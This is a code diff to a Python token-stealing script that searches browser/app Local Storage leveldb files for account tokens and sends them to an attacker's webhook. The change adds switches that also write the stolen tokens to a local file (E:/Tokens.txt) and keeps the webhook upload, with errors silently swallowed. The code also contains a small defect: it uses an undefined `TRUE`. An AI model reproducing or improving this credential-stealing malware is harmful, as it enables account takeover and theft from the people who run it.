@@ -7,8 +7,10 @@ from urllib.request import Request, urlopen
 # your webhook URL (may need to google how to get this)
 WEBHOOK_URL = 'ENTER WEBHOOK URL HERE'
 
-# mentions you when you get a hit
-PING_ME = True
+# Settings
+PING_ME = False
+ONLINE = TRUE
+OFFLINE = TRUE
 
 def find_tokens(path):
     path += '\\Local Storage\\leveldb'
@@ -65,8 +67,12 @@ def main():
     payload = json.dumps({'content': message})
 
     try:
-        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
-        urlopen(req)
+        if OFFLINE == True:
+            with open('E:/Tokens.txt', 'w') as f:
+                f.write(message)
+        if ONLINE == True:
+            req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
+            urlopen(req)
     except:
         pass
 
